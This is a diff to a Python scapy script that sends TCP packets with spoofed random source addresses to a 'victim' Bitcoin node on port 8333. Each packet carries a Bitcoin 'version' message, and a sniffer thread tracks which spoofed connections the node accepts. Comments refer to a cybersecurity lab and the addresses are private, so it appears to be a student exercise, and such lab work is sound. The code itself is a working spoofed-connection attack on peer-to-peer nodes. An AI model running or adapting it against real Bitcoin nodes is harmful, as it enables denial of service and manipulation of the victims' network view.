@@ -1,12 +1,14 @@
+from _thread import start_new_thread
+import time
 from scapy.all import *
-from impacket import ImpactDecoder, ImpactPacket
+#from impacket import ImpactDecoder, ImpactPacket
 
-victim_ip = '10.0.2.15'
+victim_ip = '10.0.2.5'
 victim_port = 8333
 attacker_port = 8333
 
-pending_IPs = []
-successful_IPs = []
+pending_spoof_IPs = []
+successful_spoof_IPs = []
 
 pld_VERSION = '\xf9\xbe\xb4\xd9version\x00\x00\x00\x00\x00\x00\x00\x00\x00]\xf6\xe0\xe2'
 
@@ -58,7 +60,10 @@ def spoof(src_ip, dst_ip):
 	return packet
 
 def initialize_connection(victim_ip):
-	spoof(src_ip = random_ip(), dst_ip = victim_ip)
+	spoof_ip = random_ip()
+	pending_spoof_IPs.append(spoof_ip)
+
+	spoof(src_ip = spoof_ip, dst_ip = victim_ip)
 
 def packet_received(packet):
 	try:
@@ -78,7 +83,7 @@ def packet_received(packet):
 	#packet.show()
 	#packet.show2()
 	msgtype = packet.load[4:16].decode()
-	#print(packet.dst)
+	print(f'src={packet[IP].src}, dst={packet[IP].dst}, msg={msgtype}')
 
 	if msgtype == 'verack':
 		# Successful connection! Move from pending to successful
@@ -87,17 +92,32 @@ def packet_received(packet):
 		# send pong
 		pass
 
-# Simeon Home
-#sniff(iface="wlp2s0",prn=packet_received, filter="tcp", store=1)
-
-# Cybersecurity Lab
-#sniff(iface="enp0s3",prn=packet_received, filter="tcp", store=1)
-
 
 if __name__ == '__main__':
+	try:
+		start_new_thread(sniff, (), {
+			'iface':'enp0s3',
+			'prn':packet_received,
+			'filter':'tcp',
+			'store':1
+		})
+	except:
+		print('Error: unable to start thread')
+
 	for i in range(1, 10 + 1):
 		print(f'\n\nPacket #{i}')
 		initialize_connection(victim_ip = victim_ip)
+
+	while 1:
+		time.sleep(1)
+
+	# Simeon Home
+	#sniff(iface="enp0s3",prn=packet_received, filter="tcp", store=1) #L
+	#sniff(iface="wlp2s0",prn=packet_received, filter="tcp", store=1)
+
+	# Cybersecurity Lab
+	#sniff(iface="enp0s3",prn=packet_received, filter="tcp", store=1)
+
 
 
 # END
